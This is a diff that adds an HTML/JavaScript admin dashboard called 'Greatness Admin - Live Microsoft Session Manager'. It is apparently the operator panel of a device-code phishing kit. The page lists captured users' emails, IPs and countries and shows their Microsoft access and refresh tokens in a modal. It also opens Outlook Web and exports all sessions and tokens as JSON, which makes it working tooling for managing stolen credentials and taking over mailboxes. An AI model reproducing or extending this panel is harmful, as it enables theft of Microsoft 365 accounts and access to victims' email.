@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Greatness Admin Dashboard - Live Sessions</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0e27; color: #e0e0e0; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid #1e2342; }
+        .logo h1 { font-size: 24px; font-weight: 600; background: linear-gradient(135deg, #6c63ff, #3b82f6); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .logo p { font-size: 12px; color: #6b7280; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; transition: transform 0.2s; }
+        .stat-card:hover { transform: translateY(-2px); border-color: #3b82f6; }
+        .stat-title { font-size: 13px; color: #8b8fbf; margin-bottom: 8px; }
+        .stat-value { font-size: 32px; font-weight: 700; color: white; }
+        .main-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
+        .card { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; }
+        .card h3 { margin-bottom: 15px; font-size: 18px; font-weight: 500; }
+        canvas { max-height: 250px; }
+        .tools-section { background: #111635; border-radius: 16px; padding: 20px; margin-bottom: 30px; border: 1px solid #1e2342; }
+        .tools-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .tools-header h3 { font-size: 18px; font-weight: 500; margin: 0; }
+        .tools-grid { display: flex; gap: 15px; flex-wrap: wrap; }
+        .tool-btn { background: linear-gradient(135deg, #1a1f3e, #111635); border: 1px solid #2a2f4e; padding: 12px 24px; border-radius: 10px; color: #e0e0e0; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s ease; display: inline-flex; align-items: center; gap: 8px; }
+        .tool-btn:hover { background: linear-gradient(135deg, #2a2f5e, #1a1f4e); border-color: #3b82f6; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2); }
+        .table-container { background: #111635; border-radius: 16px; padding: 20px; border: 1px solid #1e2342; overflow-x: auto; }
+        .table-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { text-align: left; padding: 12px 8px; border-bottom: 1px solid #1e2342; }
+        th { color: #8b8fbf; font-weight: 500; font-size: 12px; }
+        td { font-size: 13px; }
+        .open-email-btn, .view-token-btn { background: #3b82f6; border: none; padding: 6px 12px; border-radius: 6px; color: white; cursor: pointer; font-size: 11px; font-weight: 500; transition: all 0.2s; margin: 2px; }
+        .view-token-btn { background: #10b981; }
+        .view-token-btn:hover { background: #059669; }
+        .open-email-btn:hover { background: #2563eb; }
+        .badge { background: #1e3a5f; padding: 4px 12px; border-radius: 20px; font-size: 11px; color: #60a5fa; }
+        .token-modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #111635; border-radius: 16px; padding: 24px; width: 600px; max-width: 90%; z-index: 1000; border: 1px solid #3b82f6; box-shadow: 0 20px 40px rgba(0,0,0,0.5); }
+        .token-modal pre { background: #0a0e27; padding: 15px; border-radius: 8px; overflow-x: auto; font-size: 11px; margin: 15px 0; }
+        .overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; }
+        .close-modal { background: #ef4444; margin-top: 10px; }
+        .custom-legend { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 15px; justify-content: center; }
+        .legend-item { display: flex; align-items: center; gap: 8px; font-size: 12px; }
+        .legend-color { width: 20px; height: 20px; border-radius: 4px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo">
+            <h1>Greatness Admin</h1>
+            <p>Live Microsoft Session Manager</p>
+        </div>
+        <div class="badge" id="sessionCount">0 Active Sessions</div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-title">Total Visits</div>
+            <div class="stat-value" id="totalVisits">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-title">Active Sessions</div>
+            <div class="stat-value" id="activeSessions">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-title">Total Users</div>
+            <div class="stat-value" id="totalUsers">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-title">Countries</div>
+            <div class="stat-value" id="totalCountries">0</div>
+        </div>
+    </div>
+
+    <div class="main-grid">
+        <div class="card">
+            <h3>Visits (Last 12 Months)</h3>
+            <canvas id="visitsChart"></canvas>
+        </div>
+        <div class="card">
+            <h3>Active Sessions by Region</h3>
+            <canvas id="sessionsChart"></canvas>
+            <div class="custom-legend" id="customLegend"></div>
+        </div>
+    </div>
+
+    <div class="tools-section">
+        <div class="tools-header">
+            <h3>🔧 Admin Tools</h3>
+        </div>
+        <div class="tools-grid">
+            <button class="tool-btn" id="refreshSessionsBtn">🔄 Refresh Sessions</button>
+            <button class="tool-btn" id="clearAllSessionsBtn">🗑️ Clear All Sessions</button>
+            <button class="tool-btn" id="exportDataBtn">📄 Export Data</button>
+        </div>
+    </div>
+
+    <div class="table-container">
+        <div class="table-header">
+            <h3>📋 User Sessions</h3>
+            <button class="tool-btn" id="refreshTableBtn" style="padding: 8px 16px;">🔄 Refresh</button>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>IP Address</th>
+                    <th>User Agent</th>
+                    <th>Country</th>
+                    <th>Last Active</th>
+                    <th>View Token</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody id="sessionsTableBody">
+                <tr><td colspan="7" style="text-align: center;">No sessions yet. Authenticate using device code page.</td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<div class="overlay" id="overlay"></div>
+<div class="token-modal" id="tokenModal">
+    <h3>🔐 Session Token Details</h3>
+    <div id="tokenDetails"></div>
+    <button class="tool-btn close-modal" onclick="closeTokenModal()">Close</button>
+</div>
+
+<script>
+    let visitsChart, sessionsChart;
+    let countryData = {};
+
+    async function apiCall(endpoint, options = {}) {
+        try {
+            const response = await fetch(endpoint, {
+                ...options,
+                headers: { 'Content-Type': 'application/json', ...options.headers }
+            });
+            if (!response.ok) throw new Error(`API error: ${response.status}`);
+            return await response.json();
+        } catch (err) {
+            console.error('API call failed:', err);
+            return null;
+        }
+    }
+
+    async function loadSessions() {
+        const data = await apiCall('/api/sessions');
+        if (data && data.sessions) {
+            renderTable(data.sessions);
+            updateStats(data.sessions);
+            updateCharts(data.sessions);
+            document.getElementById('sessionCount').innerHTML = `${data.sessions.length} Active Sessions`;
+        }
+    }
+
+    function renderTable(sessions) {
+        const tbody = document.getElementById('sessionsTableBody');
+        if (!sessions || sessions.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="7" style="text-align: center;">No sessions found. Please authenticate using the device code page.</td></tr>';
+            return;
+        }
+        
+        tbody.innerHTML = sessions.map(session => `
+            <tr>
+                <td>${escapeHtml(session.email)}</td>
+                <td><code>${escapeHtml(session.ip || 'Unknown')}</code></td>
+                <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(session.userAgent || 'Unknown')}">
+                    ${escapeHtml((session.userAgent || 'Unknown').substring(0, 50))}...
+                </td>
+                <td>${escapeHtml(session.country || 'Unknown')}</td>
+                <td>${escapeHtml(session.lastActive || new Date().toLocaleString())}</td>
+                <td><button class="view-token-btn" onclick="viewToken('${session.sessionId}')">🔑 View Token</button></td>
+                <td><button class="open-email-btn" onclick="openOutlook('${session.email}')">✉️ Open Email</button></td>
+            </tr>
+        `).join('');
+    }
+
+    function updateStats(sessions) {
+        document.getElementById('totalVisits').innerText = sessions.length;
+        document.getElementById('activeSessions').innerText = sessions.length;
+        document.getElementById('totalUsers').innerText = sessions.length;
+        
+        // Count unique countries
+        const uniqueCountries = new Set(sessions.map(s => s.country).filter(c => c && c !== 'Unknown'));
+        document.getElementById('totalCountries').innerText = uniqueCountries.size || 1;
+    }
+
+    function updateCharts(sessions) {
+        // Prepare visit history (by month)
+        const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+        const visitData = new Array(12).fill(0);
+        
+        sessions.forEach(session => {
+            if (session.createdAt) {
+                const month = new Date(session.createdAt).getMonth();
+                visitData[month]++;
+            }
+        });
+        
+        // Update visits chart
+        if (visitsChart) visitsChart.destroy();
+        const ctx1 = document.getElementById('visitsChart').getContext('2d');
+        visitsChart = new Chart(ctx1, {
+            type: 'line',
+            data: {
+                labels: months,
+                datasets: [{
+                    label: 'Authentications',
+                    data: visitData,
+                    borderColor: '#3b82f6',
+                    backgroundColor: 'rgba(59,130,246,0.1)',
+                    tension: 0.3,
+                    fill: true,
+                    pointBackgroundColor: '#3b82f6'
+                }]
+            },
+            options: {
+                responsive: true,
+                plugins: { legend: { labels: { color: '#c4c7f0' } } },
+                scales: { y: { grid: { color: '#1e2342' }, ticks: { color: '#c4c7f0' } }, x: { ticks: { color: '#c4c7f0' } } }
+            }
+        });
+        
+        // Prepare region data
+        const regionColors = {
+            'United States': '#B22234',
+            'Canada': '#FF0000',
+            'Germany': '#FFCC00',
+            'United Kingdom': '#00247D',
+            'France': '#0055A4',
+            'Japan': '#BC002D',
+            'Australia': '#012169',
+            'Other': '#6B8E23'
+        };
+        
+        const regionCount = {};
+        sessions.forEach(session => {
+            const country = session.country || 'Other';
+            regionCount[country] = (regionCount[country] || 0) + 1;
+        });
+        
+        const regionLabels = Object.keys(regionCount);
+        const regionValues = Object.values(regionCount);
+        const regionColorsUsed = regionLabels.map(label => regionColors[label] || '#6B8E23');
+        
+        // Update sessions chart
+        if (sessionsChart) sessionsChart.destroy();
+        const ctx2 = document.getElementById('sessionsChart').getContext('2d');
+        sessionsChart = new Chart(ctx2, {
+            type: 'doughnut',
+            data: {
+                labels: regionLabels,
+                datasets: [{
+                    data: regionValues,
+                    backgroundColor: regionColorsUsed,
+                    borderColor: '#111635',
+                    borderWidth: 3,
+                    hoverOffset: 8
+                }]
+            },
+            options: {
+                responsive: true,
+                plugins: { legend: { display: false }, tooltip: { callbacks: { label: (ctx) => `${ctx.label}: ${ctx.raw} sessions` } } }
+            }
+        });
+        
+        // Build custom legend
+        const legendContainer = document.getElementById('customLegend');
+        legendContainer.innerHTML = regionLabels.map((label, index) => `
+            <div class="legend-item">
+                <div class="legend-color" style="background: ${regionColorsUsed[index]};"></div>
+                <span>${label}</span>
+                <span style="color: #8b8fbf;">(${regionValues[index]} sessions)</span>
+            </div>
+        `).join('');
+    }
+
+    async function viewToken(sessionId) {
+        const data = await apiCall(`/api/session/token/${sessionId}`);
+        if (data && data.token) {
+            const tokenHtml = `
+                <p><strong>Email:</strong> ${escapeHtml(data.email)}</p>
+                <p><strong>Expires:</strong> ${new Date(data.expiresAt).toLocaleString()}</p>
+                <p><strong>Access Token:</strong></p>
+                <pre>${escapeHtml(data.token.access_token)}</pre>
+                ${data.token.refresh_token ? `<p><strong>Refresh Token:</strong></p><pre>${escapeHtml(data.token.refresh_token)}</pre>` : ''}
+            `;
+            document.getElementById('tokenDetails').innerHTML = tokenHtml;
+            document.getElementById('tokenModal').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        } else {
+            alert('Failed to load token details');
+        }
+    }
+
+    function closeTokenModal() {
+        document.getElementById('tokenModal').style.display = 'none';
+        document.getElementById('overlay').style.display = 'none';
+    }
+
+    function openOutlook(email) {
+        // Opens Outlook Web Access directly
+        window.open(`https://outlook.office.com/mail/`, '_blank');
+    }
+
+    async function clearAllSessions() {
+        if (confirm('⚠️ WARNING: This will delete all stored sessions and tokens. You will need to re-authenticate. Continue?')) {
+            await apiCall('/api/sessions/clear', { method: 'DELETE' });
+            await loadSessions();
+            alert('All sessions cleared');
+        }
+    }
+
+    async function exportData() {
+        const data = await apiCall('/api/sessions/export');
+        if (data) {
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `sessions_export_${new Date().toISOString()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return String(str).replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // Event handlers
+    document.getElementById('refreshSessionsBtn').onclick = loadSessions;
+    document.getElementById('refreshTableBtn').onclick = loadSessions;
+    document.getElementById('clearAllSessionsBtn').onclick = clearAllSessions;
+    document.getElementById('exportDataBtn').onclick = exportData;
+    
+    // Auto-refresh every 10 seconds
+    setInterval(loadSessions, 10000);
+    
+    // Initial load
+    loadSessions();
+</script>
+</body>
+</html>
